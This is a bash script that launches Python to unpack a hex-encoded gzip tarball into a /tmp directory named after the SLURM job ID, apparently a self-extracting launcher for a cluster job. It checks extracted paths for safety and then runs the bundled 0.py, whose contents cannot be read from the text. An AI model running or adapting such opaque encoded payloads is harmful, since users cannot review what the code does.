#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172c1962282bf623bab1c7befa1eda55aad30c631d9042c20dd4dabfef7821dadd256ea6d775b759e430836f3ce30c3604af656ab9b17857ad6944e23fd7da4795e3eff9f9fafab8ade20fab261cd9cac63c6bb7c0d5f7f21df164e3f08b5d8a045db3705ab9a6acd2ad12c966831b2f341b3eede0e2c2bd76149c18a346b1ade725ed52ce365c58abacdeab22ff2b64f9bb2acfbaaa8585ed645be2e79b36eb35c34bc49eba2eb7371adda9e9db05eb4cc9a3a2b8bf0e6c0d495b3ba4f5bda893a6dfb8c8ba6cf6855e7ace2192dabbc5b178c673e64d1e53df341658d8fc9479656b46065dd95d5e2fb5b27f71f8092f1fce23efedcff699a16bff67f51e4d0ffaf813c8eda3864cf76193e04cb81d9e120dba54f4a2f0f22ea8d3ea291b9f0105d16bff7d3c86cc3107b43c2cceecbe7f42eb9e5dba041427bdb38362b4ca7af0b4e8811bee39d78727192446c36c5abd1e8bde06ec5f5f17852d29d57fbfd599cd40e272bfe194f3713be0b326ef71547cc5ae1dd5f4224f34d11b3597cba4ebc3a19c4532777c27a57dbad57f9f916c377d1a37403baec8fe851a898258859e43611eab5410249354d90ec91d20e09a2d8519070509c0dd631d6860fcc74f7434a5738d970ad9c5427716d236d701027c84b624270509df63dcb25640c721bc3a415e8133b9cc43b63b489f14765591f82184f0e275e72dcfa548e78351bde8ec15228478e0f9d34f13cb1db0fe62496e2495a77af1fa659e2973e1ae9c425398ef80218c6dd149898ab120a128a186a4ca40a198ee9d23a134f4efddbe9085c6d98ecf5f3513832a9a2f0139b247aebb30c00000000000000000000000000000000000000000000ff2b3f008477e6c300280000')
r=Path('/tmp')/('a'+j+'bf94a7976a7e9')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
